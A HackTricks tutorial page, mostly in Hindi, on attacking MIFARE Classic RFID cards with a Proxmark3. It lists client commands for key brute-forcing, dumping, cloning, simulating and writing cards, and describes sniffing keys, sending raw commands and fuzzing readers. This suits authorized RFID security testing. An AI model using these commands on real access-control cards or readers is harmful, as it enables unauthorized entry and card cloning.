# Proxmark 3

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Proxmark3 के साथ RFID सिस्टम पर हमला करना

आपको जो पहली चीज़ करनी है वह है [**Proxmark3**](https://proxmark.com) होना और [**सॉफ़्टवेयर और इसके निर्भरताएँ स्थापित करना**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux)[**s**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux).

### MIFARE Classic 1KB पर हमला करना

इसमें **16 सेक्टर** हैं, प्रत्येक में **4 ब्लॉक** हैं और प्रत्येक ब्लॉक में **16B** होता है। UID सेक्टर 0 ब्लॉक 0 में है (और इसे बदला नहीं जा सकता)।\
प्रत्येक सेक्टर तक पहुँचने के लिए आपको **2 कुंजियाँ** (**A** और **B**) चाहिए जो **प्रत्येक सेक्टर के ब्लॉक 3 में** संग्रहीत होती हैं (सेक्टर ट्रेलर)। सेक्टर ट्रेलर **एक्सेस बिट्स** भी संग्रहीत करता है जो **प्रत्येक ब्लॉक** पर **पढ़ने और लिखने** की अनुमति देते हैं 2 कुंजियों का उपयोग करके।\
2 कुंजियाँ पढ़ने की अनुमति देने के लिए उपयोगी हैं यदि आप पहली को जानते हैं और लिखने के लिए यदि आप दूसरी को जानते हैं (उदाहरण के लिए)।

कई हमले किए जा सकते हैं
```bash
proxmark3> hf mf #List attacks

proxmark3> hf mf chk *1 ? t ./client/default_keys.dic #Keys bruteforce
proxmark3> hf mf fchk 1 t # Improved keys BF

proxmark3> hf mf rdbl 0 A FFFFFFFFFFFF # Read block 0 with the key
proxmark3> hf mf rdsc 0 A FFFFFFFFFFFF # Read sector 0 with the key

proxmark3> hf mf dump 1 # Dump the information of the card (using creds inside dumpkeys.bin)
proxmark3> hf mf restore # Copy data to a new card
proxmark3> hf mf eload hf-mf-B46F6F79-data # Simulate card using dump
proxmark3> hf mf sim *1 u 8c61b5b4 # Simulate card using memory

proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to block 1
proxmark3> hf mf eget 01 # Read block 1
proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
```
The Proxmark3 allows to perform other actions like **eavesdropping** a **Tag to Reader communication** to try to find sensitive data. In this card you could just sniff the communication with and calculate the used key because the **cryptographic operations used are weak** and knowing the plain and cipher text you can calculate it (`mfkey64` tool).

### Raw Commands

IoT systems sometimes use **nonbranded or noncommercial tags**. In this case, you can use Proxmark3 to send custom **raw commands to the tags**.
```bash
proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04
SAK : 08 [2]
TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1
proprietary non iso14443-4 card found, RATS not supported
No chinese magic backdoor command detected
Prng detection: WEAK
Valid ISO14443A Tag Found - Quiting Search
```
इस जानकारी के साथ, आप कार्ड के बारे में और इसके साथ संवाद करने के तरीके के बारे में जानकारी खोजने की कोशिश कर सकते हैं। Proxmark3 कच्चे कमांड भेजने की अनुमति देता है जैसे: `hf 14a raw -p -b 7 26`

### Scripts

Proxmark3 सॉफ़्टवेयर एक प्रीलोडेड **स्वचालन स्क्रिप्ट** की सूची के साथ आता है जिसका उपयोग आप सरल कार्यों को करने के लिए कर सकते हैं। पूरी सूची प्राप्त करने के लिए, `script list` कमांड का उपयोग करें। इसके बाद, `script run` कमांड का उपयोग करें, उसके बाद स्क्रिप्ट का नाम:
```
proxmark3> script run mfkeys
```
आप एक स्क्रिप्ट बना सकते हैं ताकि **फज़ टैग रीडर्स** को, इसलिए एक **मान्य कार्ड** का डेटा कॉपी करने के लिए बस एक **Lua स्क्रिप्ट** लिखें जो एक या अधिक यादृच्छिक **बाइट्स** को **रैंडमाइज़** करे और जांचें कि क्या **रीडर क्रैश** होता है किसी भी पुनरावृत्ति के साथ।

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
